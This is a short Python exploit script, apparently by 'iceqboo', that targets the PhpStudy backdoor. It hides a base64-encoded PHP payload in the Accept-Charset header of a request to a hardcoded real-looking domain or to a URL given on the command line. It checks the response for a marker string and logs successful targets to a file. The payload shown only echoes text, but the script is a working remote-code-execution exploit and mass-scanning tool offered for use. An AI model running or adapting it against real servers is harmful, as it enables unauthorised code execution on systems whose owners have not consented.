#!/usr/bin/env python3
#-*- encoding:utf-8 -*-
# by: iceqboo

import base64
import requests
import sys


url = 'http://www.heiyanquan.com.cn'

print("======Phpstudy Backdoor Exploit============\n")
print("===========By  iceqboo=================\n")
payload = "echo \"iceqboo\";"
payload = base64.b64encode(payload.encode('utf-8'))
payload = str(payload, 'utf-8')
headers = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'accept-charset': payload,
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
}



def write_shell(url,headers):
    try:
        r = requests.get(url=url, headers=headers, verify=False,timeout=30)
        if "iceqboo" in r.text:
            print ('[ + ] BackDoor successful: '+url+'===============[ + ]\n')
            with open('success.txt','a') as f:
                    f.write(url+'\n')
        else:
            print ('[ - ] BackDoor failed: '+url+'[ - ]\n')
    except:
        print ('[ - ] Timeout: '+url+' [ - ]\n')

if len(sys.argv) > 1:
    url = sys.argv[1]
write_shell(url=url,headers=headers)